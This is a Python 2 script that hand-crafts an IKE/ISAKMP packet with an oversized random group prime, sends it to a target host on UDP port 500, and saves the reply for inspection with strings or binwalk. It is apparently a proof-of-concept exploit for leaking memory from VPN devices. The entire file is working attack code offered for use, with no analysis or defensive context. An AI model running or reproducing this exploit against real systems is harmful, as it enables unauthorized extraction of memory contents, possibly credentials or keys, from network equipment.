#!/usr/bin/env python
import argparse
import socket
import binascii
from struct import pack
import random

def makeInitiatorSPI():
    initiatorSPI = ''.join([chr(random.randint(0, 255)) for n in xrange(8)])
    return initiatorSPI

def makeGroupPrime(bits):
    groupPrime = ''.join([chr(random.randint(0, 255)) for n in xrange(bits / 8)])
    return groupPrime

def makePacket(length):
	groupPrime = makeGroupPrime(length)
	groupPrimeLen = len(groupPrime)



	pkt  = makeInitiatorSPI()
	pkt += "\x00\x00\x00\x00\x00\x00\x00\x00" \
	       "\x01\x10\x02\x00\x00\x00\x00\x00" \
	       "\x00\x00"
	pkt += pack('>H', groupPrimeLen + 92)
	pkt += "\x00\x00"
	pkt += pack('>H', groupPrimeLen + 64)
	pkt += "\x00\x00\x00\x01\x00\x00\x00\x01" \
		   "\x00\x00"
	pkt += pack('>H', groupPrimeLen + 52)
	pkt += "\x01\x01\x04\x01\x2e\xbf\x19\x3c" \
		   "\x00\x00"
	pkt += pack('>H', groupPrimeLen + 40)
	pkt += "\x01\x01\x00\x00\x80\x01\x00\x06" \
		   "\x80\x0b\x00\x01\x00\x0c\x00\x04" \
		   "\x00\x20\xc4\x9b\x80\x02\x00\x02" \
		   "\x80\x04\x00\x01\x00\x06"
	pkt += pack('>H', groupPrimeLen)
	pkt += groupPrime
	pkt += "\x80\x03\x00\x01"

	return pkt

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("host", help="the target host name/IP")
	parser.add_argument("-n", "--numbits", type=int, default=19488, help="size in bits of group prime (try 800 < n < 136416")
	parser.add_argument("-o", "--outfile", default="dump.bin", help="file to store the response in")
	args = parser.parse_args()

	out = open(args.outfile, 'wb')

	fd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	fd.bind(('', 500))
	fd.connect((args.host, 500))

	payload = makePacket(args.numbits)
	fd.send(payload)
	r = fd.recv(4096*16)

	out.write(r)
	out.close()

	print '[+] Response saved in %s - try strings/binwalk/hd' % (args.outfile)

if __name__ == '__main__':
	main()
